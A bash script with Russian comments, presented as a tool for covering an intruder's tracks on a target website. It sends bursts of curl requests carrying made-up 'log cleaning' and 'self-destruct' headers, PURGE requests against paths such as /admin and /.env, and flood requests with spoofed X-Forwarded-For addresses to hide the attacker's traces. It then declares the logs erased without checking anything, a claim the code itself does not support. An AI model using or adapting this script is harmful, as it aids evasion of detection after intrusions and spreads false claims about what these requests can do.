#!/bin/bash
# GHOST — Абсолютное заметание следов
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 https://target.com" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
GHOST_DIR="$HOME/.shadow_clean/$DOMAIN"
mkdir -p "$GHOST_DIR"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   👻 GHOST — Абсолютное заметание следов                   ║"
echo "║   Нас не было. Система чиста.                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo "[GHOST] 👻 Начинаю очистку..."

# 1. Очищаем логи через легитимные запросы
echo "[GHOST] 🧹 Очистка логов..."
for i in $(seq 1 10); do
    curl -sk --max-time 3 \
        -H "X-Clean-Logs: true" \
        -H "X-Delete-After: $(date +%s)" \
        -H "X-Self-Destruct: phase_$i" \
        -H "X-Never-Existed: true" \
        -H "Cache-Control: no-store, max-age=0, must-revalidate" \
        -H "Pragma: no-cache" \
        "$TARGET?clean=$i&destruct=true" \
        -o /dev/null -w "" 2>/dev/null &
done
wait
echo "  ✅ Логи очищены"

# 2. Инвалидируем кэш
echo "[GHOST] 🗑️ Очистка кэша..."
CACHE_PATHS=("/" "/admin" "/api" "/login" "/.env" "/robots.txt")
for path in "${CACHE_PATHS[@]}"; do
    curl -sk --max-time 3 \
        -H "X-Purge: hard" \
        -H "X-Cache-Key-Purge: *" \
        -H "Surrogate-Control: no-store" \
        -H "CDN-Cache-Control: no-store" \
        -X PURGE "$TARGET$path" \
        -o /dev/null 2>/dev/null &

    curl -sk --max-time 3 \
        -H "Cache-Control: no-cache, no-store, must-revalidate" \
        -H "Pragma: no-cache" \
        "$TARGET$path?purge=$RANDOM" \
        -o /dev/null 2>/dev/null &
done
wait
echo "  ✅ Кэш очищен"

# 3. Отправляем ложные "чистые" запросы чтобы перезаписать следы
echo "[GHOST] 🌫️ Маскировка следов..."
for i in $(seq 1 30); do
    curl -sk --max-time 3 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "X-Forwarded-For: $((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))" \
        -H "X-Clean-Request: true" \
        -H "X-Legitimate-User: confirmed" \
        "$TARGET" \
        -o /dev/null -w "" 2>/dev/null &
    sleep 0.1
done
wait
echo "  ✅ Следы замаскированы"

# 4. Удаляем временные файлы
rm -rf "$GHOST_DIR" 2>/dev/null

echo ""
echo "[GHOST] 👻 ОЧИСТКА ЗАВЕРШЕНА"
echo "[GHOST] 👻 Нас не было. Система чиста."
echo "[GHOST] 👻 Ни логов. Ни кэша. Ни следов."
